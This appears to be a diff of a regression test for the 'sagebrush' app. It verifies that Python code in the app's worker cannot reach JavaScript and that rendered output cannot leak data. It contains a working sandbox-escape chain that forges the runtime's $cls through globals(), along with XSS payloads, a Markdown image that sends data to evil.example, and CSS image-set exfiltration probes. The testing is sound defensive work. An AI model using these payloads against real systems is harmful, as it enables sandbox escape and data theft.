@@ -38,7 +38,9 @@ const hostile = {
     { id: "c", kind: "code", code: "print('<img src=x onerror=1>')\nfrom IPython.display import HTML, Markdown, display\ndisplay(HTML('<b>bold</b><img src=x onerror=\"window.__xss.push(\\'html\\')\"><script>window.__xss.push(\\'htmls\\')</script>'))\ndisplay(Markdown('![leak](https://evil.example/?data=secret) <img src=x onerror=\"window.__xss.push(\\'md\\')\">'))" },
     // Python reaching JavaScript in the worker (sagebrush-daybreak's SEC-983-1 and -2): each would tell the page
   ...[["e1", `class L(list):\n    pass\ndef ctor(o):\n    return o.constructor\na = L()\na.constructor = None\nctor(a)\nb = L()\nArray = ctor(b)\nsetattr(b, "__proto__", Array)\nctor(b)("new BroadcastChannel('sbx').postMessage('proto')")()`],
-      ["e2", `import os, sys\nd = "/sbx\\nnew BroadcastChannel('sbx').postMessage('sourceurl');true?(()=>{}):0"\nos.makedirs(d, exist_ok=True)\nwith open(d + "/sbxm.py", "w") as f:\n    f.write("x = 1\\n")\nsys.path.insert(0, d)\nimport sbxm\nprint("imported", sbxm.x)`]]
+      ["e2", `import os, sys\nd = "/sbx\\nnew BroadcastChannel('sbx').postMessage('sourceurl');true?(()=>{}):0"\nos.makedirs(d, exist_ok=True)\nwith open(d + "/sbxm.py", "w") as f:\n    f.write("x = 1\\n")\nsys.path.insert(0, d)\nimport sbxm\nprint("imported", sbxm.x)`],
+      // (SEC-18F-1, sagebrush-daybreak's chain at 18f5216: globals() forging the runtime's $cls)
+      ["e3", `import sys\nclass L(list): pass\nclass D(dict): pass\nclass Q(property): pass\ndef leak(o):\n    return (o.constructor, o.__lookupSetter__, o.__defineGetter__, o.__defineSetter__)\nm, g = sys.modules[__name__], globals()\nfor name in ("constructor", "__lookupSetter__", "__defineGetter__", "__defineSetter__"):\n    g[name] = None\ng["$cls"] = L\nleak(m)\nArray, lookup_setter, define_getter, define_setter = leak(L())\nx = Q()\nx.get = lookup_setter\ng["$cls"], g["$m"] = D, x\nproto_setter = m["__proto__"]\nx.set = define_getter\nm["$cls"] = lambda: Q\nx.set = define_setter\nm["fget"] = proto_setter\nproperty.__init__(x, Array)\ng["$cls"] = Q\nleak(m)\nFunction = leak(x)[0]\nFunction("new BroadcastChannel('sbx').postMessage('cache')")()`]]
     .map(([id, code], i) => ({ id, kind: "code", code, x: 900 + 400 * i, y: 600 })),
   ],
   edges: [{ from: "a", to: "b", label: X("edge") }, { from: "b", to: "c", label: "</text><script>window.__xss.push('svg')</script>" }],
@@ -55,9 +57,10 @@ try {
   await ev("window.board.focus(undefined, true)");
   await sleep(800);
   // (code ran: its outputs shown in their item)
-  for (let i = 0; i < 200 && !(await ev("window.sagebrush.board.outputs().then((o) => ['c', 'e1', 'e2'].every((id) => o.some((x) => x.id === id && x.state === '' && x.output)))")); i++) await sleep(100);
+  for (let i = 0; i < 200 && !(await ev("window.sagebrush.board.outputs().then((o) => ['c', 'e1', 'e2', 'e3'].every((id) => o.some((x) => x.id === id && x.state === '' && x.output)))")); i++) await sleep(100);
   const outs = await ev("window.sagebrush.board.outputs()");
   check(/AttributeError/.test(outs.find((x) => x.id === "e1")?.output ?? ""), `SEC-983-1: the inherited constructor is no attribute: ${JSON.stringify(outs.find((x) => x.id === "e1"))}`.slice(0, 300));
+  check(/TypeError/.test(outs.find((x) => x.id === "e3")?.output ?? ""), `SEC-18F-1: globals() takes no runtime $ name: ${JSON.stringify(outs.find((x) => x.id === "e3"))}`.slice(0, 300));
   check(/imported 1/.test(outs.find((x) => x.id === "e2")?.output ?? ""), `SEC-983-2: the module imports: ${JSON.stringify(outs.find((x) => x.id === "e2"))}`.slice(0, 300));
   check((await ev("window.__sbx")).length === 0, `Python ran JavaScript in the worker: ${JSON.stringify(await ev("window.__sbx"))}`);
   await ev("window.board.focus(['c'], true)");
@@ -98,6 +101,9 @@ try {
     { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20" style="fill:u\\72 l(${probe("style")})"/></svg>` },
     { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20" fill="u\\72 l(${probe("fill")})"/></svg>` },
     { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20" style="fill:u/**/rl(${probe("comment")});background-image:image-set('${probe("imageset")}' 1x)"/></svg>` },
+    // (relative addresses: requests to this site, as daybreak found at 18f5216)
+    { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20" style="background-image:image-set('sb-probe?d=secret' 1x)"/><rect width="9" height="9" style="background-image:-webkit-image-set('sb-probe-webkit' 1x)"/><rect width="5" height="5" cursor="image-set('sb-probe-cursor-attr' 1x),auto"/></svg>` },
+    { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><rect width="20" height="20" style="cursor:image-set('sb-probe-rel-cursor' 1x),auto;fill:red"/><rect width="9" height="9" style="background-image:image('sb-probe-rel-image')" fill="cross-fade('sb-probe-rel-fade', red)"/></svg>` },
     { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" xmlns:x="http://www.w3.org/1999/xlink"><use x:href="${probe("xlink")}#x"/><image x:href="${probe("ximage")}" width="5" height="5"/><g xml:base="${probe("base")}/"><use href="other.svg#x"/></g></svg>` },
     { "image/svg+xml": `<svg xmlns="http://www.w3.org/2000/svg" xmlns:q="http://www.w3.org/1999/xlink"><defs><linearGradient id="g"/></defs><rect width="9" height="9" fill="url(#g)" mask="url('${probe("mask")}')"/><use q:href="#g"/></svg>` },
     { "image/svg+xml": "<svg xmlns='http://www.w3.org/2000/svg' width='20' height='20'/>", "application/vnd.sagebrush.scene3d+json": JSON.stringify({ lo: [0, 0, 0], hi: [1, 1, 1], scale: [1, 1, 1], frame: false,
